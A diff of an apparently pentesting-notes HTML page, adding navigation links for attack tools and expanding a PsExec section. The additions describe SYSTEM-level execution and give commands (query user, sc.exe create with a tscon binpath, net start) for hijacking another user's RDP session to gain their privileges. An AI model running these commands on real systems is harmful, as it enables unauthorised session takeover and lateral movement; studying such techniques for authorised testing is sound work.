@@ -18,11 +18,11 @@
         <link rel="prev" href="../sshpass/">
       
       
-        <link rel="next" href="../sublist3r/">
+        <link rel="next" href="../subbrute/">
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.43">
     
     
       
@@ -274,6 +274,12 @@
   
     
     
+      
+        
+      
+        
+      
+        
       
         
       
@@ -1065,6 +1071,27 @@
   
   <span class="md-ellipsis">
     crackmapexec
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crowbar/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    crowbar
   </span>
   
 
@@ -4046,12 +4073,69 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="PsExec">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#psexec-for-escalating-privileges-this-method-no-longer-works-on-server-2019" class="md-nav__link">
+    <span class="md-ellipsis">
+      PsExec for escalating privileges: This method no longer works on Server 2019
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
   
 </nav>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subfinder" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    subfinder
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subbrute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    subbrute
+  </span>
+  
+
+      </a>
     </li>
   
 
@@ -16165,6 +16249,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="PsExec">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#psexec-for-escalating-privileges-this-method-no-longer-works-on-server-2019" class="md-nav__link">
+    <span class="md-ellipsis">
+      PsExec for escalating privileges: This method no longer works on Server 2019
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
@@ -16204,11 +16303,34 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c"># -nobanner:    Do not display the startup banner and copyright message.</span>
 </span></code></pre></div>
 <h2 id="psexec">PsExec</h2>
-<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipe</a> that can send commands to the system.</p>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. </p>
+<p>It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipe</a> that can send commands to the system.</p>
+<h3 id="psexec-for-escalating-privileges-this-method-no-longer-works-on-server-2019">PsExec for escalating privileges: This method no longer works on Server 2019</h3>
+<p>PsExec is particularly effective for privilege escalation because it can create and run processes with SYSTEM privileges, even if executed from an Administrator account. Here’s how this process typically works:</p>
+<ul>
+<li><strong>Command Execution as SYSTEM</strong>: When using PsExec with the <code>-s</code> flag (e.g., <code>psexec -s cmd.exe</code>), it launches a process that runs with SYSTEM privileges instead of the Administrator privileges of the account running it.</li>
+<li><strong>How It Works Internally</strong>: PsExec does this by leveraging Windows services, which typically run as SYSTEM by default. PsExec creates a temporary service on the machine to launch a command or program with SYSTEM privileges, then removes the service after completion.</li>
+<li><strong>Escalation Path</strong>: Once PsExec launches a command prompt or other executable with SYSTEM privileges, the user essentially has unrestricted access. This enables them to perform actions that would other</li>
+</ul>
+<p><strong>Example of an exploitation: creating a service that will run as SYSTEM</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>query user
+</span></code></pre></div>
+<p>Results:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a> lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sc.exe create Nameofservice binpath= &quot;cmd.exe /k tscon 2 /dest:rdp-tcp#13&quot;
+</span></code></pre></div>
+<p><strong>Explanation</strong>: Create a Windows service that, by default, run as <code>Local System</code> and will execute any binary with <code>SYSTEM</code> privileges. We use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create">Microsoft sc.exe</a> binary. First, we specify the service name (<code>Nameofservice</code>) and the <code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named <code>Nameofservice</code> will be created.</p>
+<p>Initiate the service:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>net start Nameofservice
+</span></code></pre></div>
+<p>Once the service is started, a new terminal with the <code>lewen</code> user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-24T18:13:03+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-24</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-11-01T18:53:48+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-11-01</span></small></br>
 
 
     <small>Created: February 16, 2023 21:24:34</small>
